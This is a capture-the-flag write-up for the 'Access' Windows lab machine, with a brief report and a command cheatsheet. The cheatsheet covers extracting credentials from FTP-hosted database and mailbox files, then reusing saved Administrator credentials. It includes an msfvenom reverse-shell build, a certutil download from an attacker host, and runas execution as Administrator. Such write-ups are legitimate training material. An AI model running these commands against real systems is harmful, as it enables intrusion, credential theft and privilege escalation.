# Access \[Windows Easy]

## Report

An FTP server has two files, a database and a zip file. The password to the zip file is available in the database which has many tables.

Telnet session for the user shows a `.lnk` file in the Desktop folder where `runas` is executed with saved creds which is confirmed by `cmdkey`. Transfer a reverse shell and execute it as Administrator using its saved creds.

## Cheatsheet

```
#FTP
ftp 10.10.10.98
passive (Mitigate entering passive mode)
dir
dir
binary (Set to binary mode for proper channel to download bin files)
get backup.mdb
get "Access Control.zip"
7z x Access Control.zip
mdb-tables backup.mdb
mdb-tables backup.mdb | tr ' ' '\n' | grep .
mdb-tables backup.mdb | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export backup.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done
mdb-export backup.mdb auth_user
readpst Access\ Control.pst
less Access\ Control.mbox

telnet
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred 
cmdkey /list

msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1234 -f exe > nikos.exe
certutil -urlcache -f http://10.10.14.4/nikos.exe nikos.exe
runas /savecred /user:ACCESS\Administrator "C:\ProgramData\nikos.exe"

```

## Loot

### Creds

'Access Control.mbox' - Office mail containing creds

### Proof
